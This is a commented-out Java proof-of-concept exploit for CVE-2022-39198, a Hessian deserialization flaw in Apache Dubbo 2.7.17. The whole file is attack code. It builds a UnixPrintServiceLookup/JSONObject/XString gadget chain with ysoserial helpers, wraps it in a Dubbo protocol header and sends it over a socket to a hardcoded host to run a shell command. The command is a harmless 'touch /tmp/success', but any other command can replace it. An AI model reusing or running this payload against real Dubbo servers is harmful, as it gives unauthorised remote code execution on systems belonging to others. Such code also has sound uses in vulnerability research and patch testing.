//package dubbo.cve;
//
//
//import com.alibaba.com.caucho.hessian.io.Hessian2Output;
//import com.alibaba.com.caucho.hessian.io.SerializerFactory;
//import com.sun.org.apache.xpath.internal.objects.XString;
//import org.apache.dubbo.common.io.Bytes;
//import org.apache.dubbo.common.json.JSONObject;
//import sun.misc.Unsafe;
//import sun.print.UnixPrintServiceLookup;
//import ysoserial.payloads.util.Gadgets;
//import ysoserial.payloads.util.Reflections;
//
//import java.io.ByteArrayOutputStream;
//import java.io.OutputStream;
//import java.net.Socket;
//import java.util.HashMap;
//import java.util.Random;
//
///**
// * 测试版本: dubbo 2.7.17
// * 修复版本: dubbo 2.7.18
// */
//public class CVE_2022_39198 {
//
//    static String dubbo_ip = "10.58.120.200";
//    static int dubbo_port = 20880;
//    static String cmd = "touch /tmp/success";
//
//
//    public static void setPayload(Hessian2Output hessian2Output,String cmd) throws Exception {
//
//        Unsafe unsafe = (Unsafe) Reflections.getField(Unsafe.class,"theUnsafe").get(null);
//        Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);
//        //绕过getDefaultPrinterNameBSD中的限制
//        //设置属性
//        Reflections.setFieldValue(unixPrintServiceLookup, "cmdIndex", 0);
//        Reflections.setFieldValue(unixPrintServiceLookup, "osname", "xx");
//        Reflections.setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});
//        //封装一个JSONObject对象调用getter方法
//        JSONObject jsonObject = new JSONObject();
//        jsonObject.put("xx", unixPrintServiceLookup);
//        //使用XString类调用toString方法
//        XString xString = new XString("xx");
//        HashMap map1 = new HashMap();
//        HashMap map2 = new HashMap();
//        map1.put("yy",jsonObject);
//        map1.put("zZ",xString);
//        map2.put("yy",xString);
//        map2.put("zZ",jsonObject);
//
//        HashMap hashMap = Gadgets.makeMap(map1, map2);
//
//        hessian2Output.writeObject(hashMap);
//    }
//
//    public static void main(String[] args) throws Exception {
//
//
//        // header.
//        byte[] dubbo_header = new byte[16];
//        // set magic number.
//        Bytes.short2bytes((short) 0xdabb, dubbo_header);
//        // set request and serialization flag.
//        dubbo_header[2] = (byte) ((byte) 0x80 | 2);
//
//        // set request id.
//        Bytes.long2bytes(new Random().nextInt(100000000), dubbo_header, 4);
//
//        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
//        Hessian2Output body = new Hessian2Output(bodyBaos);
//        body.setSerializerFactory(new SerializerFactory());
//        body.getSerializerFactory().setAllowNonSerializable(true);
//        setPayload(body,cmd);
//        body.flushBuffer();
//
//        Bytes.int2bytes(bodyBaos.size(), dubbo_header, 12);
//        ByteArrayOutputStream totalBaos = new ByteArrayOutputStream();
//        totalBaos.write(dubbo_header);
//        totalBaos.write(bodyBaos.toByteArray());
//
//        byte[] bytes = totalBaos.toByteArray();
//        Socket socket = new Socket(dubbo_ip, dubbo_port);
//        OutputStream outputStream = socket.getOutputStream();
//        outputStream.write(bytes);
//        outputStream.flush();
//        outputStream.close();
//
//    }
//}